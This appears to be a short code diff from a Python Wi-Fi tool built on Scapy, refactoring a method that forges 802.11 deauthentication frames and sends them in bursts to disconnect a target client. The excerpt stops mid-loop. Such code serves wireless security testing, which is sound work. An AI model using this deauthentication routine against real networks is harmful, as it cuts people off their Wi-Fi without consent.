@@ -84,13 +84,11 @@ class MonitorInterface(Interface):
     def __init__(self, name: str, channel=None):
         super().__init__(name, monitor_mode=True, channel=channel)
 
-    def deauth(self, target_mac: str, source_mac: str, bssid: str = None, count=1, burst_count=200, channel=None, reason=7):
+    def deauth(self, target_mac: str, source_mac: str, count=1, burst_count=200, channel=None, reason=7):
         self.channel_lock.acquire()
-        # Default to deauth from AP
-        bssid = bssid or source_mac
         if channel:
             self.set_channel(channel)
-        pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=source_mac, addr3=bssid) / Dot11Deauth(reason=reason)
+        pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=source_mac, addr3=self.bssid) / Dot11Deauth(reason=reason)
         for i in range(count):
             cprint("DEAUTH!!!", 'red')
             for j in range(burst_count):
